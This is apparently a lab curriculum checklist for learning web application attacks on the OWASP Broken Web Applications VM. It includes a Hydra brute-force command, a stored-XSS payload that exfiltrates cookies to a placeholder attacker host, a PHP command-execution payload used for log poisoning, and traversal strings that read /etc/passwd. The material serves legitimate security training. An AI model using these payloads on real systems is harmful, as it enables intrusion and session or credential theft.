# 🌐 OWASP Broken WebApps: Complete Web Application Security Learning Checklist

> **Purpose:** This is a structured **web application security curriculum** that uses the OWASP Broken Web Applications VM as a training ground. Every task teaches a concept, a vulnerability class, and the defense — not just an exploit.

> [!CAUTION]
> Use this **only** in your own isolated, private host-only lab network. Never run these techniques against systems you do not own or have explicit written authorization to test.

---

## 🧭 Navigation

> [🏠 Home](../../README.md) · [📋 Roadmap](../../Roadmap/README.md) · [🐧 Metasploitable 2 Lab](../Metasploitable_2/TASK_LIST.md) · [🏰 OverTheWire](../OverTheWire/README.md)

**Related Tools:**
[🕷️ Burp Suite](../../Tools/Burp_Suite.md) ·
[🗺️ Nmap](../../Tools/Nmap.md) ·
[🦈 Wireshark](../../Tools/Wireshark.md) ·
[🔓 Hydra](../../Tools/Hydra.md) ·
[🔥 Hashcat](../../Tools/Hashcat.md) ·
[🔌 Netcat](../../Tools/Netcat.md)

---

## 📊 Progress Overview

| Phase | Focus | Levels | Tasks |
|:---:|:---|:---:|:---:|
| 🏗️ Phase 1 | Foundation & HTTP Mechanics | 0–2 | 14 |
| 🔑 Phase 2 | Authentication & Input Attacks | 3–5 | 15 |
| 🛢️ Phase 3 | Injection & File Attacks | 6–8 | 15 |
| 🛡️ Phase 4 | Access Control & Trust Abuse | 9–10 | 10 |
| 🏆 Phase 5 | Chaining, Defense & Mastery | 11–13 | 14 |
| | **Total** | | **68** |

---

# 🏗️ PHASE 1: FOUNDATION & HTTP MECHANICS

---

## Level 0: Lab Environment & Proxy Setup

*Before testing any web application, configure your interception proxy, understand HTTP at the wire level, and build your notes framework.*

---

### Task 0.1 — Build the Isolated Lab Network

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Configure the OWASP Broken WebApps VM and your attacker VM (Kali/Parrot) on an isolated Host-Only network with no internet access. Verify the target's web landing page loads in your browser. |
| **Skills Learned** | Virtual networking isolation, Host-Only adapter configuration, understanding why vulnerable web applications must never be internet-accessible. |
| **Tools Used** | VirtualBox/VMware (Host-Only Adapter settings), `ip addr`, browser navigation. |
| **Expected Output** | Browser displays the OWASP BWA landing page listing all available applications. `ping` works between VMs. Neither VM can reach the internet. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Screenshot of network adapter settings for both VMs. Screenshot of the BWA landing page. Screenshot of failed internet ping from both VMs. |
| **Common Mistakes** | Using NAT mode instead of Host-Only (exposes the vulnerable VM to the internet). Not verifying isolation — assuming it works without testing. Forgetting to record the target's IP address. |

---

### Task 0.2 — Configure Burp Suite Intercepting Proxy

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Configure your browser to route all HTTP/HTTPS traffic through Burp Suite (or OWASP ZAP). Install the proxy's CA certificate so HTTPS interception works without errors. Verify you can see requests flowing through the proxy. |
| **Skills Learned** | Intercepting proxy architecture (browser → proxy → server), man-in-the-middle for analysis, CA certificate trust chains, why proxies are the single most important web testing tool. |
| **Tools Used** | Burp Suite Community/Pro or OWASP ZAP, FoxyProxy browser extension, browser certificate manager. |
| **Expected Output** | Every HTTP request appears in the proxy's HTTP History tab. HTTPS sites show no certificate warnings. Intercept toggle can pause and modify requests in real-time. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Screenshot of FoxyProxy configuration. Screenshot of Burp's HTTP History showing captured requests. Screenshot of installed CA certificate in browser settings. |
| **Common Mistakes** | Forgetting to install the CA certificate (HTTPS sites throw errors or don't load). Setting the proxy port wrong (Burp defaults to 8080). Leaving Intercept ON and wondering why pages won't load (turn it OFF for passive capture, ON only when you want to modify). Not excluding out-of-scope domains in the proxy settings. |

---

### Task 0.3 — Install Browser Testing Extensions

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Install and configure browser extensions that assist with web application testing: technology fingerprinting, cookie editing, and user-agent switching. |
| **Skills Learned** | Browser extension capabilities for security testing, technology stack identification, understanding that browsers are testing tools — not just viewers. |
| **Tools Used** | FoxyProxy (proxy switching), Wappalyzer (tech stack detection), Cookie Editor (cookie manipulation), User-Agent Switcher (header spoofing). |
| **Expected Output** | Each extension installed and verified functional. Wappalyzer correctly identifies PHP/Apache on the BWA landing page. Cookie Editor shows the current session cookies. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Screenshot of installed extensions. Wappalyzer output for the BWA landing page. |
| **Common Mistakes** | Installing too many extensions (can interfere with each other and the proxy). Not understanding which extension does what. Using extensions as a replacement for the proxy (they complement each other, not replace). |

---

### Task 0.4 — Application Inventory & Classification

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Navigate the BWA landing page and create a complete inventory of every application available. Classify each by type: training/tutorial (WebGoat, DVWA), realistic (WackoPicko, BodgeIt), outdated CMS, or custom. Map out which OWASP Top 10 categories each application covers. |
| **Skills Learned** | Application enumeration, understanding intentionally vulnerable application design, OWASP Top 10 category awareness, attack surface mapping. |
| **Tools Used** | Browser, your notes editor. |
| **Expected Output** | A markdown table listing every application with columns: Name, URL Path, Type (Training/Realistic/CMS), Technologies, OWASP Top 10 Categories Covered, Default Credentials (if known). |
| **Difficulty** | ⭐ Beginner |
| **Save These** | The complete application inventory table. Screenshots of each application's landing/login page. |
| **Common Mistakes** | Only exploring DVWA and ignoring the other 10+ applications. Not recording default credentials (many apps use `admin:admin` or `guest:guest`). Not classifying applications — this inventory guides your entire learning path. |

---

### Task 0.5 — Create Your Documentation Framework & Take Snapshot

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Set up a structured notes directory mirroring the OWASP Top 10 categories. Take a clean VM snapshot so you can reset application databases after testing. |
| **Skills Learned** | Professional documentation habits organized by vulnerability class, evidence preservation, repeatable lab environments. |
| **Tools Used** | Terminal (`mkdir -p`), your notes editor, VM snapshot manager. |
| **Expected Output** | Directory tree: `lab-notes/owasp-bwa/{setup,recon,injection,broken-auth,xss,idor,csrf,file-upload,misconfiguration,chaining,reports}`. Clean VM snapshot named and verified. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | Directory tree output. Snapshot manager screenshot showing the baseline. |
| **Common Mistakes** | Not taking a snapshot (DVWA/Mutillidae databases get corrupted after heavy testing and need resets). Using flat unorganized notes instead of a structured system. |

---

## Level 1: HTTP Protocol Fundamentals

*Before attacking web applications, you must understand HTTP at the protocol level. Every web vulnerability is a manipulation of HTTP requests and responses.*

---

### Task 1.1 — Anatomy of HTTP Requests & Responses

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Capture and annotate a complete HTTP request and response in your proxy. Label every component: method, URL, headers (Host, User-Agent, Cookie, Content-Type, Content-Length), body, status code, and response headers (Set-Cookie, Server, Content-Type). |
| **Skills Learned** | HTTP protocol structure, the role of each header, how cookies establish sessions, how Content-Type determines how the server processes input, the difference between request headers and response headers. |
| **Tools Used** | Burp Suite HTTP History tab, Burp Inspector panel. |
| **Expected Output** | An annotated diagram or markdown document showing a real captured request and response with every component labeled and explained in your own words. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | The annotated request/response. This becomes your reference sheet for all future web testing. |
| **Common Mistakes** | Memorizing header names without understanding what they do. Not understanding that cookies are sent with every request (this is why session hijacking works). Not recognizing that `Content-Type: application/x-www-form-urlencoded` vs `application/json` changes how the server parses input. |

---

### Task 1.2 — HTTP Methods: GET vs POST vs PUT vs DELETE

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify which HTTP methods different BWA applications use for different operations (login, search, form submission, file upload). Understand the security implications of each method and test for allowed but unexpected methods (PUT, DELETE, OPTIONS). |
| **Skills Learned** | HTTP method semantics, why GET requests should never modify state, how PUT/DELETE can be dangerous if enabled, using OPTIONS to discover allowed methods, method tampering attacks. |
| **Tools Used** | Burp Suite (HTTP History, Repeater), `curl -X OPTIONS http://<target>/`, `curl -X PUT`. |
| **Expected Output** | A table mapping observed application actions to their HTTP methods. OPTIONS response showing allowed methods. Documentation of any unexpectedly allowed methods (PUT, DELETE, TRACE). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | The method mapping table. OPTIONS responses. Any evidence of PUT/DELETE being allowed. |
| **Common Mistakes** | Assuming all forms use POST (some use GET, leaking data in URLs and browser history). Not testing OPTIONS on multiple paths (allowed methods can differ per directory). Not understanding that TRACE can enable cross-site tracing (XST) attacks. |

---

### Task 1.3 — Cookie Mechanics & Session Tracking

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Log into DVWA and trace the complete session lifecycle: initial request (no cookie) → server sends Set-Cookie → browser stores cookie → subsequent requests include cookie. Identify the session cookie name, value format, and security flags. |
| **Skills Learned** | Session management fundamentals, Set-Cookie/Cookie header relationship, session ID as an authentication token, cookie flags (HttpOnly, Secure, SameSite, Path, Domain, Expires) and what each protects against. |
| **Tools Used** | Burp Suite (HTTP History — filter by Set-Cookie), Cookie Editor extension, browser Developer Tools (Application → Cookies). |
| **Expected Output** | A document tracing the session lifecycle with captured headers at each step. Cookie attribute analysis table: for each cookie found, list Name, Value, HttpOnly, Secure, SameSite, Path, Expires. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | The session lifecycle trace. The cookie attribute analysis table. Notes explaining what each flag prevents (HttpOnly blocks JavaScript access → protects against XSS cookie theft; Secure ensures HTTPS-only transmission; SameSite prevents CSRF). |
| **Common Mistakes** | Not understanding that the session ID IS the authentication — if you steal it, you ARE that user. Confusing HttpOnly with Secure (they protect against different things). Not checking if the session ID changes after login (session fixation vulnerability). |

---

### Task 1.4 — Response Codes & Error Information Leakage

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Trigger different HTTP response codes (200, 301, 302, 400, 403, 404, 500) across BWA applications. Analyze error pages for information disclosure: stack traces, file paths, software versions, database errors. |
| **Skills Learned** | HTTP response code categories (2xx success, 3xx redirect, 4xx client error, 5xx server error), how error pages leak internal information, why custom error pages matter for security, information disclosure as a vulnerability class. |
| **Tools Used** | Browser, Burp Repeater (to craft requests that trigger errors), `curl`. |
| **Expected Output** | A table of triggered response codes with the URL/method that produced each. Screenshots of verbose error pages showing leaked information (paths, versions, stack traces). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Error page screenshots showing information leakage. Notes on what information was leaked and how an attacker would use it (e.g., file path disclosure helps with LFI, database error helps with SQLi). |
| **Common Mistakes** | Ignoring error messages — they are intelligence. Not recognizing that a 500 error with a SQL stack trace is confirming SQL injection. Not trying malformed inputs specifically to trigger errors. Only testing with the browser and missing response details visible in the proxy. |

---

## Level 2: Request Manipulation & Client-Side Bypass

*Learn to modify every aspect of HTTP communication. This is the core skill underlying all web application testing.*

---

### Task 2.1 — Burp Repeater: Request Modification & Replay

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Send a captured request to Burp Repeater and practice modifying each component: URL path, query parameters, headers, cookies, and body. Observe how the server's response changes with each modification. |
| **Skills Learned** | Request replay and modification workflow, understanding server-side logic by observing response changes, identifying which parameters are validated and which are trusted, the Repeater as your primary testing workbench. |
| **Tools Used** | Burp Suite Repeater tab. |
| **Expected Output** | A series of modified requests and their responses, documenting what changed. At least one case where modifying a parameter changed the application's behavior (e.g., changing a user ID, changing a price, accessing a different resource). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Before/after request pairs showing the modification and the resulting response change. Notes on which parameters the server validates vs blindly trusts. |
| **Common Mistakes** | Only modifying one parameter at a time when the vulnerability requires changing two together. Not reading the full response (checking only the body and missing important response headers). Not using Repeater's "Send" history to track what you've already tried. |

---

### Task 2.2 — Burp Intruder: Automated Parameter Fuzzing

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Use Burp Intruder to automate testing of a parameter with multiple values: a wordlist for directory brute-forcing, a number range for IDOR testing, or a credential list for brute-forcing. Understand attack types (Sniper, Battering Ram, Pitchfork, Cluster Bomb). |
| **Skills Learned** | Automated fuzzing methodology, Intruder attack type selection, payload set configuration, response analysis (length, status code, keyword grep), rate limiting awareness. |
| **Tools Used** | Burp Suite Intruder tab, wordlists from `/usr/share/wordlists/`. |
| **Expected Output** | An Intruder attack result showing differentiated responses (e.g., different response lengths indicating valid vs invalid usernames, or 200 vs 404 for directory enumeration). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Intruder configuration screenshot showing payload positions and attack type. Results sorted by response length or status code. Notes explaining when to use each attack type (Sniper for single-parameter testing, Cluster Bomb for credential pairs). |
| **Common Mistakes** | Using Cluster Bomb when Pitchfork is appropriate (Cluster Bomb tests ALL combinations — exponentially slower). Not filtering results by response length (the key differentiator). Running at full speed without considering rate limiting or account lockout. Community Edition Intruder is throttled — use Turbo Intruder or `ffuf` for speed. |

---

### Task 2.3 — Burp Decoder & Encoding Awareness

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Use Burp Decoder to encode and decode data in URL encoding, Base64, HTML entities, and hex. Identify encoded data in captured requests and decode it to understand what's being transmitted. |
| **Skills Learned** | Common encoding schemes used in web applications, why encoding is not encryption, how encoding bypass works (double-encoding, mixed encoding), recognizing encoded data by sight. |
| **Tools Used** | Burp Suite Decoder tab, CyberChef (for complex encoding chains). |
| **Expected Output** | A reference document showing the same string encoded in URL, Base64, HTML entity, and hex formats. At least one real example from a BWA application where decoding a parameter revealed hidden information. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Your encoding reference sheet. Real decoded examples from BWA applications. Notes on how to recognize each encoding type by its visual pattern (Base64 ends with `=`, URL encoding uses `%XX`, HTML entities use `&#XX;`). |
| **Common Mistakes** | Confusing encoding with encryption (encoding is reversible without a key). Not recognizing Base64 in the wild (it's everywhere: cookies, tokens, API parameters). Not trying double-encoding when a WAF blocks your payload (encode the payload, then encode the encoded version). |

---

### Task 2.4 — Client-Side Validation Bypass

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find a form in DVWA or Mutillidae that enforces input restrictions using HTML attributes (`maxlength`, `type="number"`) or JavaScript validation. Bypass the restriction by modifying the request in your proxy after it leaves the browser. |
| **Skills Learned** | The fundamental principle that client-side validation is a UX feature, not a security control. All security validation must happen server-side. How to identify client-side vs server-side validation. |
| **Tools Used** | Burp Suite Intercept (enable, modify the request, forward), browser Developer Tools (to inspect HTML validation attributes). |
| **Expected Output** | A before/after comparison: the browser-restricted input vs the proxy-modified input. Server response showing the modified value was accepted (proving no server-side validation). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Screenshots of the HTML form showing client-side restrictions. The intercepted and modified request. The server response accepting the invalid input. Notes on the security principle: "Never trust client input." |
| **Common Mistakes** | Trying to bypass validation only in the browser (editing HTML in DevTools works but intercepting in the proxy is more reliable). Not testing AFTER bypassing the client — the server might still validate (then it's not a vulnerability). Assuming that all client-side restrictions are vulnerabilities — they're only vulnerabilities if the server doesn't also validate. |

---

# 🔑 PHASE 2: AUTHENTICATION & INPUT ATTACKS

---

## Level 3: Authentication & Session Security

*Attack the login mechanisms. Understand how applications identify users and where that identification breaks.*

---

### Task 3.1 — Default Credential Discovery

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Systematically test default credentials across every application on the BWA VM: DVWA, WebGoat, Mutillidae, phpMyAdmin, BodgeIt, WackoPicko, and others. Document which credentials work where. |
| **Skills Learned** | Default credential awareness, the habit of always testing defaults first, how many real-world breaches start with default credentials, credential inventory as a pentest deliverable. |
| **Tools Used** | Browser, your application inventory from Task 0.4. Common defaults: `admin:admin`, `admin:password`, `guest:guest`, `user:user`, `tomcat:tomcat`. |
| **Expected Output** | A credential matrix: rows are applications, columns are username/password combinations, cells show success/failure. Every successful login documented with proof. |
| **Difficulty** | ⭐ Beginner |
| **Save These** | The complete credential matrix. Screenshots of successful admin logins. Notes on which applications had no authentication at all (even worse than weak credentials). |
| **Common Mistakes** | Only testing one or two credential pairs and giving up. Not testing the same credentials across multiple apps (credential reuse). Not checking for "no authentication required" endpoints (some admin panels have no login at all). Not recording failures — they prove you tested methodically. |

---

### Task 3.2 — Username Enumeration via Login Response Differences

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify applications where the login error message differs between "invalid username" and "invalid password." Use this difference to enumerate valid usernames without knowing any passwords. |
| **Skills Learned** | Username enumeration as an information disclosure vulnerability, how subtle response differences (message text, response time, response length) leak information, why login errors should be generic. |
| **Tools Used** | Burp Suite Repeater (compare responses side-by-side), Burp Intruder (automate with username wordlist, grep for response differences). |
| **Expected Output** | Evidence of different error messages for valid vs invalid usernames. List of confirmed valid usernames. Comparison showing the exact response difference (text, length, timing). |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Side-by-side response comparison screenshots. The enumerated username list. Notes on the three enumeration vectors: message text differences, response length differences, and timing differences. |
| **Common Mistakes** | Only looking at the visible error message and missing response length differences. Not testing for timing-based enumeration (valid usernames may take longer because the server checks the password hash). Not using this enumerated list in subsequent brute-force attacks. |

---

### Task 3.3 — Login Brute-Force with Hydra & Intruder

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Perform a controlled brute-force attack against a DVWA or Mutillidae login page using both Burp Intruder (to understand the process visually) and Hydra (for speed). Use a small, targeted wordlist. |
| **Skills Learned** | HTTP form brute-forcing mechanics, identifying the correct POST parameters and failure indicators, wordlist selection strategy, understanding account lockout as a defense, rate limiting detection. |
| **Tools Used** | Burp Intruder (Cluster Bomb attack type with username and password payloads), `hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`. |
| **Expected Output** | Successful credential discovery. Documentation of the exact HTTP parameters used, the failure string matched, and the number of attempts required. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Hydra command showing the syntax and result. Intruder results sorted by response length. Notes on how you identified the failure condition string. Notes on why you should use small targeted wordlists before large ones. |
| **Common Mistakes** | Getting the Hydra `http-post-form` syntax wrong (it's `"path:parameters:failure_string"`). Not identifying the correct failure string (if it's wrong, Hydra reports every attempt as successful). Not accounting for CSRF tokens in the login form (Hydra can't handle CSRF without scripting — use Burp Intruder or custom scripts instead). Forgetting cookies (DVWA requires a PHPSESSID cookie). |

---

### Task 3.4 — Session Fixation Testing

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Test whether the application assigns a new session ID after successful login, or if the pre-login session ID persists. If it persists, demonstrate a session fixation attack scenario. |
| **Skills Learned** | Session fixation vulnerability mechanics, why session IDs must be regenerated after authentication state changes, how attackers exploit fixation (set the cookie before the victim logs in, then reuse it). |
| **Tools Used** | Burp Suite HTTP History (compare Set-Cookie before and after login), Cookie Editor. |
| **Expected Output** | Comparison of session ID before login vs after login. If they're the same → session fixation vulnerability confirmed. If different → proper session regeneration. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Before/after session ID comparison. Notes explaining the attack scenario: attacker sets cookie via XSS or URL → victim logs in with that cookie → attacker uses the same cookie to access the authenticated session. |
| **Common Mistakes** | Not comparing the actual session ID values (just checking that a cookie exists is not enough). Not understanding the full attack chain (fixation alone isn't exploitable without a delivery mechanism like XSS or a crafted link). Not testing session regeneration after privilege changes (login, logout, role change). |

---

### Task 3.5 — Session Cookie Security Flag Audit

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | For every application tested, audit the session cookie's security flags: HttpOnly, Secure, SameSite, Path, Domain, and Expires/Max-Age. Rate each application's session security posture. |
| **Skills Learned** | Cookie security flag purpose and impact, how missing flags enable specific attacks (no HttpOnly → XSS steals cookies, no Secure → cookies sent over HTTP, no SameSite → CSRF possible), defense-in-depth for session management. |
| **Tools Used** | Burp Suite (inspect Set-Cookie headers), browser Developer Tools (Application → Cookies), `curl -v` (see raw headers). |
| **Expected Output** | A security audit table: Application Name, Cookie Name, HttpOnly, Secure, SameSite, Path, Expires, Overall Rating (Good/Fair/Poor). |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | The complete cookie security audit table. Notes mapping each missing flag to the specific attack it enables. |
| **Common Mistakes** | Not checking all cookies (applications may set multiple cookies). Confusing HttpOnly with Secure (HttpOnly = no JavaScript access; Secure = HTTPS-only transmission). Not understanding that SameSite=None is effectively no protection. |

---

## Level 4: Cross-Site Scripting (XSS)

*Learn the most common web vulnerability class. Understand why browsers execute attacker-controlled code and how to prove impact.*

---

### Task 4.1 — Reflected XSS Discovery & Proof

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find a reflected XSS vulnerability in DVWA (Low security). Inject a script tag that executes JavaScript in the browser. Understand the reflection path: input → server → response → browser execution. |
| **Skills Learned** | Reflected XSS mechanics, the concept of "reflection" (user input appears in the response without sanitization), why browsers execute inline scripts, the difference between XSS and HTML injection. |
| **Tools Used** | Browser, Burp Suite (to see the reflected payload in the response), DVWA XSS (Reflected) module. Payload: `<script>alert(document.cookie)</script>`. |
| **Expected Output** | Alert box displaying the session cookie. Burp capture showing the payload in the request and the unescaped payload in the response HTML. |
| **Difficulty** | ⭐⭐ Beginner-Intermediate |
| **Save These** | Screenshot of the alert box with cookie value. Burp request/response showing the reflection. The exact payload used. Notes explaining the reflection path step by step. |
| **Common Mistakes** | Using `alert(1)` instead of `alert(document.cookie)` — demonstrating cookie access proves real impact, not just script execution. Not checking the response source to see WHERE the payload is reflected (inside an HTML tag, inside a JavaScript block, inside an attribute — each requires a different payload). Not understanding that reflected XSS requires the victim to click a crafted link. |

---

### Task 4.2 — Stored XSS Discovery & Impact Demonstration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find a stored XSS vulnerability in DVWA (Low security) or Mutillidae. Inject a script that persists in the application and executes for every user who views the page. Demonstrate cookie exfiltration to an attacker-controlled listener. |
| **Skills Learned** | Stored (persistent) XSS vs reflected XSS, why stored XSS is higher severity (no victim interaction needed beyond normal browsing), cookie exfiltration technique, setting up a listener to receive stolen data. |
| **Tools Used** | DVWA XSS (Stored) module, Mutillidae blog/guestbook. Payload: `<script>new Image().src="http://<attacker>:8888/?c="+document.cookie;</script>`. Listener: `nc -lvnp 8888` or `python3 -m http.server 8888`. |
| **Expected Output** | Payload stored in the application database. Every page visit triggers the script. Attacker's listener receives the victim's session cookie. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Screenshot of the stored payload rendering. Listener output showing received cookies. Burp response showing the stored payload in the page source. Notes comparing severity of stored vs reflected XSS. |
| **Common Mistakes** | Not setting up the listener before injecting the payload (the cookie is sent but nobody's listening). Not URL-encoding special characters in the exfiltration URL. Only testing in the same browser session (stored XSS impacts other users — test by opening a different browser or private window). Corrupting the page with broken HTML and not being able to remove the payload (reset the DVWA database). |

---

### Task 4.3 — DOM-Based XSS

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find a DOM-based XSS vulnerability where the payload never reaches the server — it's processed entirely by client-side JavaScript. Understand the source → sink model for DOM XSS. |
| **Skills Learned** | DOM XSS mechanics (JavaScript reads from a "source" like `location.hash` and writes to a "sink" like `innerHTML` without sanitization), why DOM XSS bypasses server-side filtering, client-side source code analysis. |
| **Tools Used** | Browser Developer Tools (Sources/Console tabs), DVWA XSS (DOM) module or Mutillidae DOM injection pages. |
| **Expected Output** | XSS execution without the payload appearing in any server-side HTTP request (verified in proxy history). Identification of the JavaScript source and sink. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Screenshot of DOM XSS firing. Proxy history proving the payload was NOT sent to the server. Browser source code highlighting the vulnerable JavaScript (source and sink). |
| **Common Mistakes** | Not understanding why this is different from reflected XSS (the server never sees the payload — it's entirely a client-side issue). Not checking the proxy history to confirm the payload stayed client-side. Not reading the JavaScript source to understand the vulnerable code path. |

---

### Task 4.4 — XSS Filter Bypass Techniques

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Attempt XSS on DVWA at Medium and High security levels. Identify how the application filters or encodes your payloads and develop bypass techniques for each filter. |
| **Skills Learned** | Common XSS filters (stripping `<script>`, HTML encoding, blacklist approaches), bypass techniques (case variation, event handlers, alternative tags, encoding tricks), why blacklists always fail and output encoding is the correct defense. |
| **Tools Used** | Burp Repeater (rapid payload iteration), DVWA at Medium/High security. Bypass payloads: `<ScRiPt>alert(1)</ScRiPt>`, `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`, `<body onload=alert(1)>`. |
| **Expected Output** | For each security level: the filter mechanism identified, the bypass payload that worked, and explanation of why the bypass worked. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | A filter bypass matrix: Security Level → Filter Used → Bypass Payload → Why It Works. Notes on why blacklists are fundamentally flawed (there are infinite ways to write JavaScript). |
| **Common Mistakes** | Trying the same payload repeatedly instead of analyzing what the filter removes/modifies. Not reading the DVWA source code (the "View Source" button shows you the PHP filter code — use it to understand what you're bypassing). Giving up after one blocked payload instead of iterating systematically through bypass techniques. |

---

## Level 5: File Inclusion & Path Traversal

*Exploit the server's file system through vulnerable file loading mechanisms.*

---

### Task 5.1 — Local File Inclusion (LFI) — Reading System Files

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit a file inclusion parameter to read `/etc/passwd` from the server. Understand how `include()`, `require()`, and similar functions become vulnerabilities when they accept user input. |
| **Skills Learned** | LFI vulnerability mechanics, directory traversal syntax (`../`), how PHP include functions work, critical files to target on Linux systems (`/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, Apache access logs). |
| **Tools Used** | Browser/Burp Repeater, DVWA File Inclusion module or Mutillidae. Payload: `?page=../../../../../../etc/passwd`. |
| **Expected Output** | Contents of `/etc/passwd` displayed in the browser or response body. Understanding of the user accounts on the system from the file contents. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | The request showing the traversal payload. The response containing the file contents. Notes on what each field in `/etc/passwd` means (username:x:uid:gid:info:home:shell). List of other interesting files to read via LFI. |
| **Common Mistakes** | Not using enough `../` sequences (you need to traverse up to the root from the application's current directory). Not trying null byte termination (`%00`) on older PHP versions to strip appended extensions. Not recognizing that LFI can read any file the web server user has permission to access — not just `/etc/passwd`. |

---

### Task 5.2 — LFI Filter Bypass Techniques

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Bypass LFI filters at Medium/High DVWA security levels. Test techniques: double encoding (`%252e%252e%252f`), null byte injection (`%00`), PHP stream wrappers (`php://filter/convert.base64-encode/resource=`), and alternate traversal sequences. |
| **Skills Learned** | Input filter bypass methodology, PHP wrapper exploitation, encoding tricks, why allowlists are better than blocklists for file inclusion, the power of `php://filter` for reading PHP source code. |
| **Tools Used** | Burp Repeater, DVWA at Medium/High security. Key payload: `php://filter/convert.base64-encode/resource=index` (reads PHP source code as base64 — decode to see the source). |
| **Expected Output** | Successful file read at each security level with the bypass technique documented. PHP source code read via `php://filter` — decoded from Base64. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Each bypass payload and the security level it defeated. Decoded PHP source code retrieved via `php://filter`. Notes on each bypass technique and when to use it. |
| **Common Mistakes** | Not trying `php://filter` — it's one of the most powerful LFI techniques because it lets you read PHP source code (normally the server executes it instead of displaying it). Not URL-decoding your payloads correctly for double-encoding attacks. Not understanding that null byte (`%00`) only works on PHP < 5.3.4. |

---

### Task 5.3 — LFI to Remote Code Execution via Log Poisoning

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Chain LFI with log poisoning to achieve code execution. Inject PHP code into Apache's access log via a crafted User-Agent header, then include the log file through the LFI vulnerability to execute the code. |
| **Skills Learned** | Attack chaining (LFI + log poisoning = RCE), how web server logs contain user-controlled data, why log files are dangerous when includable, the concept of "log poisoning" as a stepping stone from file read to code execution. |
| **Tools Used** | Burp Repeater (to send a request with a PHP payload in the User-Agent header), then LFI to include the log. Payload in User-Agent: `<?php system($_GET['cmd']); ?>`. Include: `?page=../../../../../../var/log/apache2/access.log&cmd=id`. |
| **Expected Output** | Command output (`uid=www-data`) displayed in the response. Progression from passive file reading to active code execution using only LFI. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The User-Agent poisoning request. The LFI inclusion request showing command output. A diagram showing the two-step attack chain. Notes on other log files and includable files that could be poisoned. |
| **Common Mistakes** | Poisoning the log with broken PHP (if the syntax is wrong, every subsequent include of the log file fails — you need to reset the VM). Not knowing the log file path (try `/var/log/apache2/access.log`, `/var/log/httpd/access_log`, `/var/log/apache/access.log`). Including the log before poisoning it (the PHP code isn't there yet). Not URL-encoding the User-Agent payload properly. |

---

# 🛢️ PHASE 3: INJECTION & FILE ATTACKS

---

## Level 6: SQL Injection

*Master the most impactful web vulnerability class. Learn to extract, modify, and weaponize database access.*

---

### Task 6.1 — SQL Injection Detection & Confirmation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify a SQL injection point in DVWA (Low security). Confirm injection by observing different responses to `1' AND '1'='1` (true condition) vs `1' AND '1'='2` (false condition). Understand why the single quote breaks the query. |
| **Skills Learned** | SQL injection detection methodology, boolean-based confirmation, understanding string context in SQL queries, how user input becomes part of a SQL statement, the concept of "in-band" injection. |
| **Tools Used** | Browser, Burp Repeater, DVWA SQL Injection module. |
| **Expected Output** | Different responses for true vs false conditions (confirming injection). Raw SQL error message (if available) showing the query structure. Explanation of what `' OR '1'='1` does to the SQL query internally. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | True-condition and false-condition responses side-by-side. Any SQL error messages showing query structure. Your written explanation of how the injection modifies the original query (draw it out). |
